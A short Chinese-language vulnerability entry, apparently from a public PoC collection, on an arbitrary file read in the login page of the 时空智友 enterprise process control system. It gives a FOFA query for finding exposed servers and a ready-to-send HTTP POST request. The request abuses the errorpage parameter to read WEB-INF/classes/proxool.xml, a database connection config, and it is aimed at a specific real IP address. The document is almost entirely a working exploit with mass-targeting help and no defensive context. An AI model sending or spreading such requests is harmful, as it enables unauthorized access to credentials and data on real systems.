# 时空智友企业流程化管控系统 login 文件读取漏洞

    ## fofa

```
body="企业流程化管控系统" && body="密码(Password):"
```



## poc

```
POST /login HTTP/1.1
Host: 111.39.94.182:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip
Content-Length: 111

op=verify%7Clogin&targetpage=&errorpage=WEB-INF/classes/proxool.xml&mark=&tzo=480&username=admin&password=admin
```
